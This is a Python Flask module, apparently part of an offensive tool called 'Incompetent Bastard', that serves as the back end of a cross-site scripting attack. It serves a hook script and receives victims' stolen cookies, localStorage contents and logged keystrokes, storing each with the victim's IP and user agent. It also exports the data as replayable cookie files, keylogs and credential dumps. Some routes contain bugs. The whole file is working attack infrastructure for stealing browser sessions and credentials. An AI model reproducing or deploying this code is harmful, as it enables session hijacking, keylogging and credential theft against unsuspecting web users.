from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response
from meuk.flask.models import *
from datetime import date
import hashlib
import calendar
import datetime
 

vandaag = date.today()



xxs_bp = Blueprint('xxs_bp', __name__,
                    template_folder='html',
                    static_folder='static')


@xxs_bp.route("/x.js", methods=["GET","POST"])
@xxs_bp.route("/xxs.js", methods=["GET", "POST"])
def xss_hooked():
    ip = request.remote_addr
    if ip != '127.3.0.1':
        ua = request.headers.get('User-Agent')
        loc = request.headers.get('Referer')
        md5 = hashlib.md5(str(ip+ua).encode())
        hebben = db_xxs_cookies.query.filter_by(ip=ip, agent=ua, md5=md5.hexdigest()).first()
        if hebben == None:
            bevdb = db_xxs_hooked(ip=ip, agent=ua, md5=md5.hexdigest())
            db.session.add(bevdb)
            db.session.commit()
        pagina = render_template('xss.html')
    else:
        pagina = render_template('xss-blanco.html', localhost='http://localhost')

    return pagina, 200, {
        'Content-Type': 'text/javascript',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    }



@xxs_bp.route("/xxs/cookies", methods=["GET"])
def xss_cookies():
    ip = request.remote_addr
    if request.args.get('data') and ip != '127.3.0.1':

        loc = request.headers.get('Referer')
        ua = request.headers.get('User-Agent')

        md5 = hashlib.md5(request.args.get('data').encode())
 
        hebben = db_xxs_cookies.query.filter_by(ip=ip, agent=ua, md5=md5.hexdigest()).first()
        if hebben == None:
            bevdb = db_xxs_cookies(ip=ip, agent=ua, locatie=loc, datum=vandaag, md5=md5.hexdigest(), cookies=request.args.get('data'))
            db.session.add(bevdb)
            db.session.commit()

        return '[!] Tot ziens en bedankt voor de vis.'
    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback
@xxs_bp.route("/xxs/localstorage", methods=["GET"])
def xss_localstorage():

    ip = request.remote_addr
    if request.args.get('data') and ip != '127.3.0.1':

        loc = request.headers.get('Referer')
        ua = request.headers.get('User-Agent')

        md5 = hashlib.md5(request.args.get('data').encode())
 
        hebben = db_xxs_localstorage.query.filter_by(ip=ip, agent=ua, md5=md5.hexdigest()).first()
        if hebben == None:
            bevdb = db_xxs_localstorage(ip=ip, agent=ua, locatie=loc, datum=vandaag, md5=md5.hexdigest(), localstorage=request.args.get('data'))
            db.session.add(bevdb)
            db.session.commit()




        return '[!] Tot ziens en bedankt voor de vis.'

    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback
@xxs_bp.route("/xxs/gebruiker", methods=["GET"])
def xss_cors():
    return '[!] Tot ziens en bedankt voor de vis.'

#xxe callback
@xxs_bp.route("/xxs/commands", methods=["GET"])
def xss_c2():
    return '[!] Tot ziens en bedankt voor de vis.'



@xxs_bp.route("/xxs/keylogger", methods=["GET"])
def xss_keylogger():
    ip = request.remote_addr
    if ip != '127.3.0.1':


        loc = request.headers.get('Referer')
        ua = request.headers.get('User-Agent')
        data = request.args.get('data')
        if data == '':
            data =' '

        hebben = db_xxs_keylogger.query.filter_by(ip=ip, agent=ua, locatie=loc).first()
        if hebben == None:
            bevdb = db_xxs_keylogger(ip=ip, agent=ua, locatie=loc, datum=vandaag, toetsen=data)
            db.session.add(bevdb)
            db.session.commit()
        else:
            bevdb = db_xxs_keylogger.query.get(hebben.id)
            bevdb.toetsen = hebben.toetsen+data
            db.session.commit()
        return '[!] Tot ziens en bedankt voor de vis.'

    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")


@xxs_bp.route("/dashboard/xxs", methods=["GET", "POST"])
def xxs_dashboard():
    hooked = db_xxs_hooked.query.all()
    cookies = db_xxs_cookies.query.order_by('datum').all()
    keylogger = db_xxs_keylogger.query.order_by('datum').all()
    localstorage=db_xxs_localstorage.query.order_by('datum').all()
    
    #keysbekijken

    #overzichtweergeven
    pagina = render_template('xss_dashboard.html', cookies=cookies, keylogger=keylogger, localstorage=localstorage,  hooked=hooked, aantalhooked=len(hooked))
    return pagina


@xxs_bp.route("/dashboard/xxs/download_cookies/<int:id>", methods=["GET", "POST"])
def xxs_download_cookies(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    cookies = db_xxs_cookies.query.filter_by(id=id)
    waarden = ''
    regel="\n[host]\tTRUE\t/\tFALSE\t[tijdstip]\t[naam]\t[waarde]"
    for x in cookies:
        for f in x.cookies.split(';'):
            y= f.split('=')
            waarden = waarden + regel.replace('[host]', str(x.ip)).replace('[tijdstip]', str(tijdstip)).replace('[naam]', str(y[0]).strip()).replace('[waarde]', str(f.replace(y[0]+'=','')).strip())


    header='''# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by Incompetent Bastard'''

    return header+waarden, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="cookies_'+x.ip+'.txt"',
        'Content-Length': str(len(header+waarde,))}

@xxs_bp.route("/dashboard/xxs/download_toetsen/<int:id>", methods=["GET", "POST"])
def xxs_download_toetsen(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    data = db_xxs_keylogger.query.filter_by(id=id).first()
    waarden = data.toetsen



    header='''# Keylog: [host] ([agent])
# location: [locatie]
# This file was generated by Incompetent Bastard'''
    tekst = header.replace('[host]', data.ip).replace('[agent]', data.agent).replace('[locatie]', data.locatie)+"\n\n"+waarden
    return tekst, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="keylogger_'+data.ip+'.txt"',
        'Content-Length': str(len(tekst))}


@xxs_bp.route("/dashboard/xxs/download_localstorage/<int:id>", methods=["GET", "POST"])
def xxs_download_localstorage(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    data = db_xxs_localstorage.query.filter_by(id=id).first()
    waarden = data.localstorage



    header='''# LocalStorage: [host] ([agent])
# location: [locatie]
# This file was generated by Incompetent Bastard'''
    tekst = header.replace('[host]', data.ip).replace('[agent]', data.agent).replace('[locatie]', data.locatie)+"\n\n"+waarden
    return tekst, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="localstorage_'+data.ip+'.txt"',
        'Content-Length': str(len(tekst))}


@xxs_bp.route("/dashboard/xxs/download_creds/<int:id>", methods=["GET", "POST"])
def xxs_download_creds(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    data = db_xxs_localstorage.query.filter_by(id=id).first()
    waarden = data.username+':'+data.password



    header='''# Creds: [host] ([agent])
# location: [locatie]
# This file was generated by Incompetent Bastard'''
    tekst = header.replace('[host]', data.ip).replace('[agent]', data.agent).replace('[locatie]', data.locatie)+"\n\n"+waarden
    return tekst, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="localstorage_'+data.ip+'.txt"',
        'Content-Length': str(len(tekst))}